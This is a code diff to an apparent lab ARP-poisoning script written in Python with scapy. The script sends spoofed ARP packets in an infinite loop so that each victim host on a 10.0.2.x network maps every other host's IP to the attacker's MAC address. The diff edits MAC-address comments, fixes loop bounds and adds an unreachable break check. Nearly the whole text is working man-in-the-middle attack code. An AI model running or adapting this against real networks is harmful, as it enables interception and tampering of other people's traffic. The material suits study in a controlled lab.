@@ -10,11 +10,13 @@ import logging as log
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 
 # In enp0s9
-# MAC Address M1: 08:00:27:B7:C4:AF
+# MAC Address M1: 08:00:27:B7:C4:AF - 08:00:27:76:14:01
 # IP Address M1: 10.0.2.5
-# MAC Address Gateway: 52:54:00:12:35:00
+
+# MAC Address Gateway: 52:54:00:12:35:00 
 # IP Address Gateway: 10.0.2.1
-# MAC Address Attacker (M3): 08:00:27:D0:25:4B
+
+# MAC Address Attacker (M3): 08:00:27:D0:25:4B - 08:00:27:e6:97:2f
 # IP Address Attacker (M3): 10.0.2.4
 
 # The main method to be ran by the user of our script
@@ -54,6 +56,8 @@ def arp_poison():
     # Send ARP package to every victim saying that each other victim is the attacker using the spoofed MAC address of the attacker
     # i goes through all the hosts and represents the victims that will be fooled
     for i in range(nrOfHosts):
+        if (i==nrOfHosts):
+                break
         # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
         for j in range(nrOfHosts):
             # No need to send ARP package to itself.
@@ -61,13 +65,13 @@ def arp_poison():
                 j+=1
             # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
             # We must thus break the loop so we do not have an IndexError.
-            if (j>nrOfHosts):
+            if (j==nrOfHosts):
                 break
             arp = Ether() / ARP()
             arp[Ether].src = macAttacker
             arp[ARP].hwsrc = macAttacker
             arp[ARP].psrc = ipVictimList[j] # spoofed
-            arp[ARP].hwdst = macVictimList[i] # fooled
+            arp[ARP].hwdst = macVictimList[i] # tricked
             arp[ARP].pdst = ipVictimList[i]
             sendp(arp, iface="enp0s9")
     
@@ -77,6 +81,8 @@ def arp_poison():
     # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
     while(True):     
         for i in range(nrOfHosts):
+            if (i==nrOfHosts):
+                break
             # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
             for j in range(nrOfHosts):
                 # No need to send ARP package to itself.
@@ -84,13 +90,13 @@ def arp_poison():
                     j+=1
                 # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
                 # We must thus break the loop so we do not have an IndexError.
-                if (j>nrOfHosts):
+                if (j==nrOfHosts):
                     break
                 arp = Ether() / ARP()
                 arp[Ether].src = macAttacker
                 arp[ARP].hwsrc = macAttacker
                 arp[ARP].psrc = ipVictimList[j] # spoofed
-                arp[ARP].hwdst = macVictimList[i] # fooled
+                arp[ARP].hwdst = macVictimList[i] # tricked
                 arp[ARP].pdst = ipVictimList[i]
                 sendp(arp, iface="enp0s9")
         # Timer
